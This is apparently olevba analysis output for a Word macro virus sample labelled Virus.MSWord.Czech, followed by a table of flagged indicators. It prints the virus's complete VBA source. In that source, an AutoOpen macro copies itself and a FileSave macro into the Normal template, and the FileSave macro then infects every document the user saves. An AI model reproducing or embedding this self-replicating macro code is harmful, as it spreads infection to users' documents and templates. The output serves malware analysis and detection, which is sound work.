olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Czech-a419f18c2fb596d51d9b447d5321ad36495d02f5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Czech-a419f18c2fb596d51d9b447d5321ad36495d02f5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Czech-a419f18c2fb596d51d9b447d5321ad36495d02f5 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
  Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
  WordBasic.CurValues.FileSummaryInfo dlg
  WordBasic.MacroCopy dlg.FileName + ":AutoOpen", "normal:AutoOpen"
  WordBasic.MacroCopy dlg.FileName + ":FileSave", "normal:FileSave"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Czech-a419f18c2fb596d51d9b447d5321ad36495d02f5 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Ulozí aktivní dokument nebo šablonu."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
  Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
  On Error GoTo -1: On Error GoTo ErrorHandler
  WordBasic.FileSave
  WordBasic.CurValues.FileSaveAs dlg
  If dlg.Format = 0 Then
    dlg.Format = 1
    WordBasic.FileSaveAs dlg
    WordBasic.MacroCopy "normal:AutoOpen", dlg.Name + ":AutoOpen"
    WordBasic.MacroCopy "normal:FileSave", dlg.Name + ":FileSave"
  End If
ErrorHandler:
  Select Case Err.Number
    Case 102    'Input box was canceled
    Case Else   'Any other error condition
  End Select
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

